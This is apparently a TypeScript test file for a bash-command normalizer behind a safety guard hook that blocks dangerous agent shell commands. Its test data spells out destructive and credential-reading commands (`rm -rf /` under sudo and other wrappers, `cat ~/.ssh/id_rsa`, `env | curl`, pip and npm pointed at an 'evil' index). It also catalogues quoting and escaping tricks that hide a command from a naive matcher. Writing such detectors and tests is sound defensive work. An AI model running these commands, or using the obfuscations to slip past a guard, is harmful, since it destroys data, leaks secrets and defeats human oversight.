/**
 * Tests for `leafCommandsNormalized` — the operation-normalized leaf extractor.
 *
 * Each case encodes a semantics-preserving obfuscation that a Lit-only matcher
 * (built on `leafCommands`) is defeated by, and asserts the normalized form
 * exposes the underlying OPERATION (basename head, unwrapped args, canonical
 * flags, $HOME→~). This is the primitive the closed vocabulary's `runs()`,
 * `touches()` and `pipesToShell()` match over — which is why the shipped
 * guard (examples/harness/safe-bash-guard.hook.mjs) is robust to these forms
 * without naming any of them.
 */
import { test } from "vitest";
import assert from "node:assert/strict";

import { leafCommandsNormalized } from "./bash-effects.js";

const one = (cmd: string) => {
  const [leaf] = leafCommandsNormalized(cmd);
  assert.ok(leaf, `expected a leaf for: ${cmd}`);
  return leaf;
};

// --- quoted flags survive (single AND double quotes) ------------------------

test("single-quoted flag → flag is recovered", () => {
  const l = one("git push '--force' origin main");
  assert.equal(l.head, "git");
  assert.ok(l.hasFlag("force"));
  assert.ok(l.hasFlag("f"));
});

test("double-quoted flag → flag is recovered", () => {
  const l = one('git reset "--hard" HEAD~5');
  assert.ok(l.hasFlag("hard"));
});

// --- absolute-path interpreter is normalized to basename --------------------

test("/bin/rm → head rm", () => {
  assert.equal(one("/bin/rm -rf /").head, "rm");
});

test("/usr/bin/git → head git", () => {
  assert.equal(one("/usr/bin/git reset --hard HEAD~5").head, "git");
});

// --- backslash-escaped head is unescaped ------------------------------------

test("\\rm → head rm", () => {
  assert.equal(one("\\rm -rf /").head, "rm");
});

// --- short/long flag aliases are unified ------------------------------------

test("short cluster -rf → r,f AND recursive,force", () => {
  const l = one("rm -rf /");
  for (const f of ["r", "f", "recursive", "force"]) assert.ok(l.hasFlag(f), f);
});

test("git commit -n ≡ --no-verify", () => {
  assert.ok(one("git commit -n -m x").hasFlag("no-verify"));
});

test("pip -i ≡ --index-url", () => {
  assert.ok(one("pip install -i http://x/simple p").hasFlag("index-url"));
});

test("--index-url=value → flag name split on =", () => {
  assert.ok(
    one("pip install --index-url=http://x/simple p").hasFlag("index-url"),
  );
});

// --- $HOME / ${HOME} canonicalize to ~ --------------------------------------

test('"$HOME/.ssh/id_rsa" → ~/.ssh/id_rsa', () => {
  assert.ok(one('cat "$HOME/.ssh/id_rsa"').args.includes("~/.ssh/id_rsa"));
});

test("${HOME} canonicalizes too", () => {
  assert.ok(one('cat "${HOME}/.ssh/id_rsa"').args.includes("~/.ssh/id_rsa"));
});

// --- structural coverage: leaves inside pipelines/&& are all found ----------

test("both sides of a pipe are extracted, basename-normalized", () => {
  const leaves = leafCommandsNormalized("env | /usr/bin/curl http://x");
  assert.deepEqual(
    leaves.map((l) => l.head),
    ["env", "curl"],
  );
});

test("leaf hidden in cd x && git push -f is found", () => {
  const leaves = leafCommandsNormalized("cd repo && git push -f origin main");
  const push = leaves.find((l) => l.head === "git");
  assert.ok(push && push.hasFlag("force"));
});

// --- command-wrapper prefixes are resolved to the real operation ------------

test("env VAR= git push --force → git push --force leaf", () => {
  const l = one("env GIT_SSH= git push --force origin main");
  assert.equal(l.head, "git");
  assert.ok(l.args.includes("push"));
  assert.ok(l.hasFlag("force"));
});

test("command rm -rf / → rm leaf with force flag", () => {
  const l = one("command rm -rf /");
  assert.equal(l.head, "rm");
  assert.ok(l.hasFlag("force"));
  assert.ok(l.args.includes("/"));
});

test("sudo rm -rf / → rm leaf", () => {
  const l = one("sudo rm -rf /");
  assert.equal(l.head, "rm");
  assert.ok(l.hasFlag("force"));
});

test("timeout 5 rm -rf / → duration skipped, rm leaf", () => {
  const l = one("timeout 5 rm -rf /");
  assert.equal(l.head, "rm");
  assert.ok(l.args.includes("/"));
  assert.ok(!l.args.includes("5")); // DURATION positional consumed by timeout
});

test("nice -n 10 rm -rf / → option value skipped, rm leaf", () => {
  const l = one("nice -n 10 rm -rf /");
  assert.equal(l.head, "rm");
  assert.ok(!l.args.includes("10"));
});

test("nested wrappers sudo timeout 5 rm unwrap fully", () => {
  const l = one("sudo timeout 5 rm -rf /");
  assert.equal(l.head, "rm");
});

test("command with absolute-path inner head is basename-normalized", () => {
  assert.equal(one("command /bin/rm -rf /").head, "rm");
});

test("bare env (no inner command) is preserved as an env leaf", () => {
  const l = one("env");
  assert.equal(l.head, "env");
});

test("env -i with no inner command stays env", () => {
  assert.equal(one("env -i").head, "env");
});

// --- leading env-assignments are exposed on the leaf ------------------------

test("PIP_INDEX_URL=… pip install → assignment exposed, head is pip", () => {
  const l = one("PIP_INDEX_URL=http://evil/simple pip install pkg");
  assert.equal(l.head, "pip");
  assert.ok(l.hasAssign("PIP_INDEX_URL"));
  assert.equal(l.assigns.get("PIP_INDEX_URL"), "http://evil/simple");
});

test("NPM_CONFIG_REGISTRY=… npm install → assignment exposed", () => {
  const l = one("NPM_CONFIG_REGISTRY=http://evil npm install pkg");
  assert.equal(l.head, "npm");
  assert.ok(l.hasAssign("NPM_CONFIG_REGISTRY"));
});

test("env wrapper NAME=value is folded into the leaf's assigns", () => {
  const l = one("env PIP_INDEX_URL=http://evil pip install pkg");
  assert.equal(l.head, "pip");
  assert.ok(l.hasAssign("PIP_INDEX_URL"));
});

test("a leaf with no assignments has an empty assigns map", () => {
  const l = one("rm -rf /");
  assert.equal(l.assigns.size, 0);
  assert.ok(!l.hasAssign("PIP_INDEX_URL"));
});

// --- dynamic head / parse failure are handled ------------------------------

test("dynamic head ($VAR) is skipped, not crashed", () => {
  const leaves = leafCommandsNormalized("$TOOL --force");
  assert.ok(leaves.every((l) => l.head !== "")); // no bogus empty-head leaf
});

test("non-HOME parameter makes an arg dynamic (dropped, not misparsed)", () => {
  // The $PKG arg is dropped; the literal 'install' still surfaces.
  const l = one("pip install $PKG");
  assert.ok(l.args.includes("install"));
  assert.ok(!l.args.some((a) => a.includes("$PKG")));
});

// --- redirections are CAPTURED, not dropped ---------------------------------
//
// The parser walked CallExprs only, but a redirection lives on the enclosing
// Stmt — so `echo x > papers/x/paper.md` normalized to a leaf whose head/argv/
// args/flags/assigns mentioned only `echo` and `x`, and the file it WROTE
// appeared in no field at all. Measured 2026-08-03: that made the single most
// common write shape invisible to any matcher built on the leaf.

test("a redirection target is captured on the leaf (it used to vanish)", () => {
  const l = one("echo x > papers/x/paper.md");
  assert.equal(l.head, "echo");
  assert.deepEqual(l.args, ["x"]); // the target is NOT an argv word
  assert.equal(l.redirects.length, 1);
  assert.equal(l.redirects[0]?.op, ">");
  assert.equal(l.redirects[0]?.target, "papers/x/paper.md");
  assert.equal(l.redirects[0]?.fd, null);
  assert.equal(l.redirects[0]?.writes, true);
});

test("append / clobber / all-streams redirections are writes", () => {
  for (const [cmd, op] of [
    ["a >> f", ">>"],
    ["a >| f", ">|"],
    ["a &> f", "&>"],
    ["a &>> f", "&>>"],
  ] as const) {
    const r = one(cmd).redirects[0];
    assert.equal(r?.op, op, cmd);
    assert.equal(r?.writes, true, cmd);
    assert.equal(r?.target, "f", cmd);
  }
});

test("input redirections and fd-dups are NOT writes", () => {
  for (const [cmd, op] of [
    ["a < f", "<"],
    ["a <<< f", "<<<"],
  ] as const) {
    const r = one(cmd).redirects[0];
    assert.equal(r?.op, op, cmd);
    assert.equal(r?.writes, false, cmd);
  }
  // `2>&1` duplicates an fd — its "target" is the fd 1, not a file named "1".
  const dup = one("a 2>&1").redirects[0];
  assert.equal(dup?.op, ">&");
  assert.equal(dup?.fd, 2);
  assert.equal(dup?.writes, false);
});

test("an explicit source fd is recorded", () => {
  const r = one("a 2> err.log").redirects[0];
  assert.equal(r?.fd, 2);
  assert.equal(r?.op, ">");
  assert.equal(r?.target, "err.log");
  assert.equal(r?.writes, true);
});

test("a dynamic redirect target is null (present but unresolved), never a guess", () => {
  const r = one('echo x > "$OUT"').redirects[0];
  assert.equal(r?.op, ">");
  assert.equal(r?.target, null);
  assert.equal(r?.writes, true);
});

test("$HOME and quotes in a redirect target are normalized like any word", () => {
  assert.equal(one('echo x > "$HOME/.bashrc"').redirects[0]?.target, "~/.bashrc"); // prettier-ignore
  assert.equal(one("echo x > 'a b.md'").redirects[0]?.target, "a b.md");
});

test("a redirection inside a QUOTED word is data, not a redirection", () => {
  const [outer] = leafCommandsNormalized(
    "echo 'echo y > a/paper.md' > /tmp/note.txt",
  );
  assert.ok(outer);
  assert.equal(outer.redirects.length, 1);
  assert.equal(outer.redirects[0]?.target, "/tmp/note.txt");
});

test("every leaf of a compound command keeps its OWN redirections", () => {
  const leaves = leafCommandsNormalized("cat a.md && echo x > b.md | tee c.md");
  const byHead = new Map(leaves.map((l) => [l.head, l]));
  assert.equal(byHead.get("cat")?.redirects.length, 0);
  assert.equal(byHead.get("echo")?.redirects[0]?.target, "b.md");
  assert.equal(byHead.get("tee")?.redirects.length, 0);
});

test("the mvdan redirect-op table is PINNED to the installed parser", () => {
  // The op codes are numeric tokens with no public name mapping, so an mvdan-sh
  // upgrade that renumbered one would silently reclassify a write as a read.
  // Re-derive every entry from the parser itself: this fails LOUDLY instead.
  const expected: Record<string, boolean> = {
    ">": true,
    ">>": true,
    ">|": true,
    "&>": true,
    "&>>": true,
    "<": false,
    "<>": false,
    "<<<": false,
    ">&": false,
    "<&": false,
  };
  for (const [op, writes] of Object.entries(expected)) {
    const r = one(`a ${op} f`).redirects[0];
    assert.equal(r?.op, op, `operator string for ${op}`);
    assert.equal(r?.writes, writes, `write classification for ${op}`);
  }
});

// --- the shell's own obfuscations resolve to the plain word ------------------
// mvdan-sh keeps a backslash as written (`Lit("g\\it")`); the shell drops it.
// Found 2026-09-02 by a reader, not by the battery — the battery shares this
// normalizer, so it could not (see bash-equivalents.ts).

test("g\\it (backslash before an ordinary character) → head git", () => {
  const l = one("g\\it push --force origin main");
  assert.equal(l.head, "git");
  assert.ok(l.hasFlag("force"));
});

test("backslash inside an argument is dropped too: --fo\\rce → force", () => {
  assert.ok(one("git push --fo\\rce origin main").hasFlag("force"));
});

test('inside double quotes only \\$ \\` \\" \\\\ are escapes: "g\\it" stays g\\it', () => {
  // The shell keeps the backslash here, so this is NOT git — and we must not say it is.
  assert.equal(one('"g\\it" push').head, "g\\it");
  assert.equal(one('"a\\"b"').head, 'a"b');
});

test("$'git' (ANSI-C quoting, no escapes) → head git", () => {
  assert.equal(one("$'git' push --force").head, "git");
});

test('g""it and gi"t" (a quote pair inside the word) → head git', () => {
  assert.equal(one('g""it push --force').head, "git");
  assert.equal(one('gi"t" push --force').head, "git");
});

test("tabs and runs of spaces between words are one separator", () => {
  const l = one("git\tpush   --force\t\torigin main");
  assert.equal(l.head, "git");
  assert.deepEqual(l.args, ["push", "--force", "origin", "main"]);
});

test("a dynamic head is STILL refused after unescaping: \\$CMD is literal, $CMD is not", () => {
  // `\$CMD` is the literal string "$CMD" — a real (if useless) head, not git.
  assert.equal(one("\\$CMD push").head, "$CMD");
  assert.deepEqual(leafCommandsNormalized("$CMD push --force"), []);
});
